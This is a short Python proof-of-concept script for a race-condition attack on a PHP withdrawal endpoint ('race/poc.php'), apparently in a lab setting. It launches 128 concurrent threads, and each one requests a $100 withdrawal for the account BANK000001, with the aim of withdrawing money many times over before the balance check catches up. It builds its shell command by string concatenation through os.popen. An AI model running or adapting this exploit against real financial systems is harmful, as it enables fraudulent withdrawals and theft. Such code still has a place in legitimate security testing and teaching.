import os
from threading import Thread

def thread():
    url_test = 'http://domain1.sec/race/poc.php?user_code=BANK000001&amount=100'
    print(os.popen('php -r ' + '"echo file_get_contents(\'' + url_test + '\');"').read())

if __name__ == '__main__':
    # Withdraw 128 times with 128 concurrent process, $100 each process.
    for i in range(128):
        p = Thread(target=thread)
        p.daemon = True
        p.start()
